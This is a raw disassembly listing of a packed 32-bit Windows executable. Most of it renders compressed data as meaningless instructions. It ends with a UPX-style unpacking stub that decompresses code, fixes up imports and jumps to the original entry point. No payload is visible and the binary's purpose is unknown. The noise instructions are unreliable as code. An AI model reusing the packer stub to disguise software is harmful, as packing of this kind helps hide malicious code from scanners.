  4a54c1:	or     DWORD PTR [ebp+0x7f],0xd3136401
  4a54c8:	add    al,0x4b
  4a54ca:	add    DWORD PTR [eax-0x1c3b7dfb],edi
  4a54d0:	dec    edi
  4a54d1:	inc    edx
  4a54d2:	ins    BYTE PTR es:[edi],dx
  4a54d3:	gs popa 
  4a54d5:	test   BYTE PTR [esi+edx*4],0x66
  4a54d9:	clc    
  4a54da:	inc    edi
  4a54db:	cli    
  4a54dc:	lds    esi,FWORD PTR [ecx+0x72]
  4a54df:	je     0x4a5532
  4a54e1:	popa   
  4a54e2:	or     eax,0x75510f05
  4a54e7:	test   BYTE PTR [ecx-0x68],bh
  4a54ea:	je     0x4a54f6
  4a54ec:	push   ds
  4a54ed:	(bad)  
  4a54ee:	fiadd  WORD PTR [edx]
  4a54f0:	stos   BYTE PTR es:[edi],al
  4a54f1:	pop    edi
  4a54f2:	cmp    esi,DWORD PTR [edi-0x5c]
  4a54f5:	dec    eax
  4a54f6:	xor    al,0x33
  4a54f8:	pop    es
  4a54f9:	js     0x4a556c
  4a54fb:	push   esi
  4a54fc:	push   eax
  4a54fd:	fs dec eax
  4a54ff:	add    cl,BYTE PTR [eax+0x3e]
  4a5502:	fs mov esi,0xdd0869e2
  4a5508:	xor    al,0x5f
  4a550a:	jle    0x4a54d4
  4a550c:	xchg   ecx,eax
  4a550d:	sub    dh,dl
  4a550f:	mov    cl,0xc9
  4a5511:	add    ch,BYTE PTR [edi]
  4a5513:	pop    es
  4a5514:	and    BYTE PTR [ebp+0x36],bl
  4a5517:	icebp  
  4a5518:	xor    DWORD PTR [bp+di],edx
  4a551b:	(bad)  [ecx]
  4a551d:	mov    ebx,0x28af50cb
  4a5522:	and    ebp,ebp
  4a5524:	xchg   ecx,eax
  4a5525:	imul   BYTE PTR [ebp+0x27]
  4a5528:	push   edi
  4a5529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a552a:	mov    ah,0x17
  4a552c:	adc    ah,BYTE PTR [ecx-0x50]
  4a552f:	xor    eax,0x2190484
  4a5534:	xchg   ecx,eax
  4a5535:	cmp    al,BYTE PTR [ebp-0x1d]
  4a5538:	ret    
  4a5539:	retf   0xed01
  4a553c:	xchg   esi,eax
  4a553d:	es retf 0x198
  4a5541:	in     eax,dx
  4a5542:	pop    ss
  4a5543:	jno    0x4a5571
  4a5545:	mov    ?,WORD PTR [ebx+0x49]
  4a5548:	outs   dx,BYTE PTR ds:[esi]
  4a5549:	shl    DWORD PTR [ebx],cl
  4a554b:	push   esi
  4a554c:	add    al,0x19
  4a554e:	outs   dx,DWORD PTR ds:[esi]
  4a554f:	and    DWORD PTR [edi-0x650da738],edx
  4a5555:	pop    es
  4a5556:	push   ebx
  4a5557:	je     0x4a54da
  4a5559:	sub    eax,0x81f72296
  4a555e:	rcr    DWORD PTR [edx-0x2597def4],0xff
  4a5565:	jne    0x4a54f3
  4a5567:	std    
  4a5568:	adc    al,0x5c
  4a556a:	fld    st(4)
  4a556c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a556d:	test   eax,0x8f789b22
  4a5572:	cwde   
  4a5573:	sbb    DWORD PTR [ebp+0x21],ebp
  4a5576:	inc    ebp
  4a5577:	push   edi
  4a5578:	mov    ch,0xb3
  4a557a:	fs pop edx
  4a557c:	push   0xb0b8eb16
  4a5581:	nop
  4a5582:	jg     0x4a55b9
  4a5584:	dec    eax
  4a5585:	lods   al,BYTE PTR gs:[esi]
  4a5587:	sub    ch,ch
  4a5589:	ins    BYTE PTR es:[edi],dx
  4a558a:	adc    DWORD PTR [ebx+0x276a8105],0x9badd123
  4a5594:	js     0x4a5585
  4a5596:	(bad)  
  4a5597:	out    0x6d,al
  4a5599:	jne    0x4a5607
  4a559b:	xchg   edi,eax
  4a559c:	xchg   ebp,eax
  4a559d:	fldenv [esi]
  4a559f:	es cs sti 
  4a55a2:	add    DWORD PTR [edx],edx
  4a55a4:	inc    ebx
  4a55a5:	jae    0x4a5532
  4a55a7:	sbb    edx,DWORD PTR [ecx+0xe]
  4a55aa:	jo     0x4a55cd
  4a55ac:	xchg   ebx,eax
  4a55ad:	(bad)  
  4a55ae:	aas    
  4a55af:	push   ss
  4a55b0:	fwait
  4a55b1:	push   eax
  4a55b2:	inc    ebp
  4a55b3:	add    BYTE PTR [eax],al
  4a55b5:	dec    esp
  4a55b6:	add    DWORD PTR [ebx],eax
  4a55b8:	add    BYTE PTR [ecx-0x6db0717c],ah
  4a55be:	ror    BYTE PTR [edx],0x19
  4a55c1:	dec    edx
  4a55c2:	add    DWORD PTR [ebx],ecx
  4a55c4:	pushf  
  4a55c5:	jge    0x4a5589
  4a55c7:	sbb    ch,ah
  4a55c9:	loop   0x4a554b
  4a55cb:	daa    
  4a55cc:	pop    eax
  4a55cd:	adc    al,0xd9
  4a55cf:	aaa    
  4a55d0:	aaa    
  4a55d1:	inc    ecx
  4a55d2:	test   eax,eax
  4a55d4:	add    BYTE PTR es:[eax+0x17],al
  4a55d8:	fucomip st,st(7)
  4a55da:	mov    ch,0x7b
  4a55dc:	push   es
  4a55dd:	add    al,0xc
  4a55df:	jp     0x4a55e7
  4a55e1:	sgdtd  [eax+0xa]
  4a55e5:	das    
  4a55e6:	lock idiv BYTE PTR [esi+0x2d24b0a]
  4a55ed:	and    DWORD PTR [eax],edx
  4a55ef:	add    eax,0xdbda220f
  4a55f4:	xchg   esi,eax
  4a55f5:	or     eax,0x9eace401
  4a55fa:	sub    BYTE PTR [ecx+ecx*8+0x5f],dl
  4a55fe:	mov    ah,BYTE PTR [eax+0x200009d0]
  4a5604:	addr16 jo 0x4a5591
  4a5607:	mov    ebp,0xc920e8bd
  4a560c:	push   0x742e4f01
  4a5611:	fidiv  DWORD PTR [esi]
  4a5613:	shr    edi,0x30
  4a5616:	push   cs
  4a5617:	jo     0x4a55bc
  4a5619:	or     DWORD PTR [ecx],esp
  4a561b:	mov    al,0xf
  4a561d:	add    DWORD PTR [esp+edi*2],ebx
  4a5620:	mov    ebx,edi
  4a5622:	mov    fs,WORD PTR [eax+0x2e]
  4a5625:	fs pop edx
  4a5627:	push   ss
  4a5628:	mov    eax,0xdfeef70b
  4a562d:	mov    ah,0x35
  4a562f:	pop    es
  4a5630:	add    DWORD PTR [eax+0x22],eax
  4a5633:	cs jb  0x4a56a9
  4a5636:	jb     0x4a569b
  4a5638:	addr16 push ss
  4a563a:	fidivr DWORD PTR [ebx-0x4f68987d]
  4a5640:	cmovg  eax,DWORD PTR [edx+edx*2]
  4a5644:	fld    QWORD PTR [edx]
  4a5646:	push   ebx
  4a5647:	mov    dh,BYTE PTR [esi+ebp*4+0x2f]
  4a564b:	mov    eax,ds:0x6e092492
  4a5650:	scas   al,BYTE PTR es:[edi]
  4a5651:	add    BYTE PTR [eax],al
  4a5653:	sub    cl,BYTE PTR [ecx-0x1]
	...
  4a565e:	add    BYTE PTR [eax],al
  4a5660:	pusha  
  4a5661:	mov    esi,0x482000
  4a5666:	lea    edi,[esi-0x81000]
  4a566c:	push   edi
  4a566d:	or     ebp,0xffffffff
  4a5670:	jmp    0x4a5682
  4a5672:	nop
  4a5673:	nop
  4a5674:	nop
  4a5675:	nop
  4a5676:	nop
  4a5677:	nop
  4a5678:	mov    al,BYTE PTR [esi]
  4a567a:	inc    esi
  4a567b:	mov    BYTE PTR [edi],al
  4a567d:	inc    edi
  4a567e:	add    ebx,ebx
  4a5680:	jne    0x4a5689
  4a5682:	mov    ebx,DWORD PTR [esi]
  4a5684:	sub    esi,0xfffffffc
  4a5687:	adc    ebx,ebx
  4a5689:	jb     0x4a5678
  4a568b:	mov    eax,0x1
  4a5690:	add    ebx,ebx
  4a5692:	jne    0x4a569b
  4a5694:	mov    ebx,DWORD PTR [esi]
  4a5696:	sub    esi,0xfffffffc
  4a5699:	adc    ebx,ebx
  4a569b:	adc    eax,eax
  4a569d:	add    ebx,ebx
  4a569f:	jae    0x4a56ac
  4a56a1:	jne    0x4a56cb
  4a56a3:	mov    ebx,DWORD PTR [esi]
  4a56a5:	sub    esi,0xfffffffc
  4a56a8:	adc    ebx,ebx
  4a56aa:	jb     0x4a56cb
  4a56ac:	dec    eax
  4a56ad:	add    ebx,ebx
  4a56af:	jne    0x4a56b8
  4a56b1:	mov    ebx,DWORD PTR [esi]
  4a56b3:	sub    esi,0xfffffffc
  4a56b6:	adc    ebx,ebx
  4a56b8:	adc    eax,eax
  4a56ba:	jmp    0x4a5690
  4a56bc:	add    ebx,ebx
  4a56be:	jne    0x4a56c7
  4a56c0:	mov    ebx,DWORD PTR [esi]
  4a56c2:	sub    esi,0xfffffffc
  4a56c5:	adc    ebx,ebx
  4a56c7:	adc    ecx,ecx
  4a56c9:	jmp    0x4a571d
  4a56cb:	xor    ecx,ecx
  4a56cd:	sub    eax,0x3
  4a56d0:	jb     0x4a56e3
  4a56d2:	shl    eax,0x8
  4a56d5:	mov    al,BYTE PTR [esi]
  4a56d7:	inc    esi
  4a56d8:	xor    eax,0xffffffff
  4a56db:	je     0x4a5752
  4a56dd:	sar    eax,1
  4a56df:	mov    ebp,eax
  4a56e1:	jmp    0x4a56ee
  4a56e3:	add    ebx,ebx
  4a56e5:	jne    0x4a56ee
  4a56e7:	mov    ebx,DWORD PTR [esi]
  4a56e9:	sub    esi,0xfffffffc
  4a56ec:	adc    ebx,ebx
  4a56ee:	jb     0x4a56bc
  4a56f0:	inc    ecx
  4a56f1:	add    ebx,ebx
  4a56f3:	jne    0x4a56fc
  4a56f5:	mov    ebx,DWORD PTR [esi]
  4a56f7:	sub    esi,0xfffffffc
  4a56fa:	adc    ebx,ebx
  4a56fc:	jb     0x4a56bc
  4a56fe:	add    ebx,ebx
  4a5700:	jne    0x4a5709
  4a5702:	mov    ebx,DWORD PTR [esi]
  4a5704:	sub    esi,0xfffffffc
  4a5707:	adc    ebx,ebx
  4a5709:	adc    ecx,ecx
  4a570b:	add    ebx,ebx
  4a570d:	jae    0x4a56fe
  4a570f:	jne    0x4a571a
  4a5711:	mov    ebx,DWORD PTR [esi]
  4a5713:	sub    esi,0xfffffffc
  4a5716:	adc    ebx,ebx
  4a5718:	jae    0x4a56fe
  4a571a:	add    ecx,0x2
  4a571d:	cmp    ebp,0xfffffb00
  4a5723:	adc    ecx,0x2
  4a5726:	lea    edx,[edi+ebp*1]
  4a5729:	cmp    ebp,0xfffffffc
  4a572c:	jbe    0x4a573c
  4a572e:	mov    al,BYTE PTR [edx]
  4a5730:	inc    edx
  4a5731:	mov    BYTE PTR [edi],al
  4a5733:	inc    edi
  4a5734:	dec    ecx
  4a5735:	jne    0x4a572e
  4a5737:	jmp    0x4a567e
  4a573c:	mov    eax,DWORD PTR [edx]
  4a573e:	add    edx,0x4
  4a5741:	mov    DWORD PTR [edi],eax
  4a5743:	add    edi,0x4
  4a5746:	sub    ecx,0x4
  4a5749:	ja     0x4a573c
  4a574b:	add    edi,ecx
  4a574d:	jmp    0x4a567e
  4a5752:	pop    esi
  4a5753:	mov    edi,esi
  4a5755:	mov    ecx,0x1dac
  4a575a:	mov    al,BYTE PTR [edi]
  4a575c:	inc    edi
  4a575d:	sub    al,0xe8
  4a575f:	cmp    al,0x1
  4a5761:	ja     0x4a575a
  4a5763:	cmp    BYTE PTR [edi],0xe
  4a5766:	jne    0x4a575a
  4a5768:	mov    eax,DWORD PTR [edi]
  4a576a:	mov    bl,BYTE PTR [edi+0x4]
  4a576d:	shr    ax,0x8
  4a5771:	rol    eax,0x10
  4a5774:	xchg   ah,al
  4a5776:	sub    eax,edi
  4a5778:	sub    bl,0xe8
  4a577b:	add    eax,esi
  4a577d:	mov    DWORD PTR [edi],eax
  4a577f:	add    edi,0x5
  4a5782:	mov    al,bl
  4a5784:	loop   0x4a575f
  4a5786:	lea    edi,[esi+0xa3000]
  4a578c:	mov    eax,DWORD PTR [edi]
  4a578e:	or     eax,eax
  4a5790:	je     0x4a57d7
  4a5792:	mov    ebx,DWORD PTR [edi+0x4]
  4a5795:	lea    eax,[eax+esi*1+0xab744]
  4a579c:	add    ebx,esi
  4a579e:	push   eax
  4a579f:	add    edi,0x8
  4a57a2:	call   DWORD PTR [esi+0xab780]
  4a57a8:	xchg   ebp,eax
  4a57a9:	mov    al,BYTE PTR [edi]
  4a57ab:	inc    edi
  4a57ac:	or     al,al
  4a57ae:	je     0x4a578c
  4a57b0:	mov    ecx,edi
  4a57b2:	jns    0x4a57bb
  4a57b4:	movzx  eax,WORD PTR [edi]
  4a57b7:	inc    edi
  4a57b8:	push   eax
  4a57b9:	inc    edi
  4a57ba:	mov    ecx,0xaef24857
  4a57bf:	push   ebp
  4a57c0:	call   DWORD PTR [esi+0xab784]
  4a57c6:	or     eax,eax
  4a57c8:	je     0x4a57d1
  4a57ca:	mov    DWORD PTR [ebx],eax
  4a57cc:	add    ebx,0x4
  4a57cf:	jmp    0x4a57a9
  4a57d1:	call   DWORD PTR [esi+0xab794]
  4a57d7:	mov    ebp,DWORD PTR [esi+0xab788]
  4a57dd:	lea    edi,[esi-0x1000]
  4a57e3:	mov    ebx,0x1000
  4a57e8:	push   eax
  4a57e9:	push   esp
  4a57ea:	push   0x4
  4a57ec:	push   ebx
  4a57ed:	push   edi
  4a57ee:	call   ebp
  4a57f0:	lea    eax,[edi+0x1e7]
  4a57f6:	and    BYTE PTR [eax],0x7f
  4a57f9:	and    BYTE PTR [eax+0x28],0x7f
  4a57fd:	pop    eax
  4a57fe:	push   eax
  4a57ff:	push   esp
  4a5800:	push   eax
  4a5801:	push   ebx
  4a5802:	push   edi
  4a5803:	call   ebp
  4a5805:	pop    eax
  4a5806:	popa   
  4a5807:	lea    eax,[esp-0x80]
  4a580b:	push   0x0
  4a580d:	cmp    esp,eax
  4a580f:	jne    0x4a580b
  4a5811:	sub    esp,0xffffff80
  4a5814:	jmp    0x401458
	...
